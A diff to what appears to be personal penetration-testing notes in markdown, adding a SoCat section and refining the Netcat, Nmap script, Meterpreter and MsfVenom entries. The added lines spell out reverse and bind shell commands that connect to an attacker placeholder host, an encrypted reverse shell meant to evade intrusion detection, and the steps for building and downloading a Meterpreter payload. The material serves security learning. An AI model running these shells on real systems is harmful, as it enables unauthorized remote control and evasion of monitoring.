@@ -141,7 +141,7 @@ This reconstruction is performed by _right-clicking a packet > Follow Stream_.
 
 ### NetCat / Ncat
 
-NetCat is a command-line utility available on Windows and Linux to read from and write to network connections.  
+**NetCat** is a command-line utility available on Windows and Linux to read from and write to network connections.  
 It offers a backend for other machines to connect to a machine.  
 It is often used to create a backdoor to access a machine remotely.
 
@@ -153,7 +153,7 @@ NetCat can be used in multiple ways :
 - chat
 
 ```shell
-# start NetCat in listening mode on port 1234
+# start NetCat in listening mode on port 1234 (for a reverse shell for example)
 nc -l -p 1234
 
 # from another machine, open a connection to it (for chat for example)
@@ -177,10 +177,66 @@ It adds command history navigation (with up/down arrows) and line editing :
 rlwrap nc -lp 1234
 ```
 
-An alternative to Netcat is `ncat`, the Netcat enhancement by the Nmap project.  
+**Ncat** is an enhancement of Netcat created by the Nmap project.  
 It supports for example IPv6, and SSL encryption for the listener with the `--ssl` parameter :
 ```shell
 ncat --ssl -lvnp 1234
+```
+
+
+### SoCat
+
+**SoCat** is a "super NetCat" offering additional advanced features but with a more complex syntax.  
+It adds SSL/TLS encryption (like NCat), more complex redirection, and more stable connections.  
+SoCat essentially is a connector between two different points (port, keyboard, file...).
+
+_Basic use of SoCat (equivalent to NetCat)_
+```shell
+# Reverse-shell : simple listening connection on a TCP port, equivalent to "nc -lvnp 443"
+# It binds a listening port with the standard output (represented with a dash)
+# Note that this type of listener can be connected to by SoCat but also by basic Netcat or Netcat with rlwrap
+socat TCP-L:443 -
+
+# from the target machine, connect to the above reverse shell
+socat TCP:<ATTACKER_IP>:443 EXEC:powershell.exe,pipes    # Windows target ("pipes" forces Windows to use Linux-style I/O)
+socat TCP:<ATTACKER_IP>:443 EXEC:"bash -li"              # Linux target
+
+# Bind-shell : simple listening connection on the target machine
+socat TCP-L:443 EXEC:powershell.exe,pipes    # Windows target ("pipes" forces Windows to use Linux-style I/O)
+socat TCP-L:443 EXEC:"bash -li"              # Linux target
+ 
+ # from the attacker machine, connect to the above bind shell
+ socat TCP:<TARGET_IP>:443 -
+```
+
+_Advanced use of SoCat for more stable shell (Linux only)_
+```shell
+# start a listener connecting the open port with the file descriptor of the current terminal (instead of the terminal output)
+# this allows to pass options "raw" and "echo=0" to force it to forward raw data without interpreting them
+socat TCP-L:443 FILE:`tty`,raw,echo=0
+
+# from the target machine, connect to that listener
+# This requires SoCat to be available on the target machine (usually downloaded as a pre-compiled binary)
+# We pass a number of options to stabilize the shell
+socat TCP:<ATTACKER_IP>:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+We can use encryption with OpenSSL to encrypt the traffic and prevent IDS to analyze it.  
+This requires to create a certificate locally, and use it without verification :
+```shell
+# local machine : create a new 2048-bit RSA key with its certificate
+# All requested info can be left blank or use random values
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+# local machine : merge the key and the certificate files into a single PEM file
+cat shell.key shell.crt > shell.pem
+
+# local machine start a SoCat listener using that key/certificate
+# Note that we could use here the more stable version using the tty file descriptor as well
+socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
+
+# target machine : connect to the above listener
+socat OPENSSL:<ATTACKER_IP>:443,verify=0 EXEC:/bin/bash
 ```
 
 
@@ -643,6 +699,8 @@ nmap 192.168.0.1 --host-timeout 100 -F      # specify the max time we can wait f
 The NSE is a Lua interpreter integrated in Nmap that supports the execution of custom Lua scripts.  
 
 The default Nmap installation contains around 600 scripts in the `/usr/share/nmap/scripts` folder.  
+We can find on the Nmap website the documentation and categories of every built-in script : https://nmap.org/nsedoc/scripts/
+
 The built-in scripts are divided into multiple categories (a script can be in multiple categories) : 
 - `auth` : authentication related scripts
 - `broadcast` : discover hosts by sending broadcast messages
@@ -1428,15 +1486,15 @@ We can list the different flavors of Meterpreter in MsfVenom with the `msfvenom 
 We can see that it has different versions depending on the OS of the target machine (Android, iOS, Linux, OSX, Windows).  
 It also has versions that depend on a technology being available on the target machine (Java, PHP, Python).  
 
-Meterpreter payloads exist in **inline** (also called **single**) or **staged** form.  
+Meterpreter payloads exist in **inline** (also called **single** or **stageless**) or **staged** form.  
 An inline payload contains the entire payload in its binary.  
-A staged payload is smaller and contains only a stager, that downloads the rest from the attacker machine when executed.  
+A staged payload is smaller and contains only a stager, that downloads the actual payload from the attacker machine and runs it in memory.  
 Inline payloads use the `_` symbol, for example `python/meterpreter_reverse_tcp` is inline and `python/meterpreter/reverse_tcp` is its staged equivalent.  
 
 Exploits in Metasploit only support a subset of payloads, that can be listed with `show payloads` when the exploit module is loaded.
 
 Meterpreter exposes its own set of specialized commands to interact with the target machine.  
-These can vary from a version of Meterpreter to the other, so check avaliable commands listed in the `help` command. 
+These can vary from a version of Meterpreter to the other, so check available commands listed in the `help` command. 
 
 ```shell
 help                             # show available Meterpreter commands
@@ -1494,7 +1552,7 @@ It can also create a golden Kerberos ticket to get access with any user to any c
 #### MsfVenom
 
 MsfVenom is a tool to create custom payloads, replacing deprecated tools MsfPayload and MsfEncode since 2015.  
-It has access to all payloads in Metasploit and can craft payloads in several formats (PHP, exe, dll, elf, jar ...) 
+It has access to all payloads in Metasploit and can craft payloads in several formats (PHP, exe, py, dll, elf, jar ...) 
 for different target systems (windows, linux, apple, android...).
 
 ```shell
@@ -1513,7 +1571,7 @@ To start this handler, we can run the `exploit/multi/handler` module in Metasplo
 
 For example, we can craft a Meterpreter reverse shell binary for a x86 Linux system with : 
 ```shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_IP> -f elf > reverse_shell.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f elf > reverse_shell.elf
 ```
 
 We can then transfer this binary to the target system.  
@@ -1527,7 +1585,7 @@ wget http://<LOCAL_IP>:9000/reverse_shell.elf
 ```
 
 Before we run the reverse shell on the target machine, we need a handler that can catch it on the local machine.  
-We can use the `exploit/multi/handler` module but we need to set its payload to the same one as the venom reverse shell (otherwise, segmentation fault).  
+We can use the `exploit/multi/handler` module, but we need to set its payload to the same one as the venom reverse shell (otherwise, segmentation fault).  
 ```shell
 # in Metasploit console
 use exploit/multi/handler
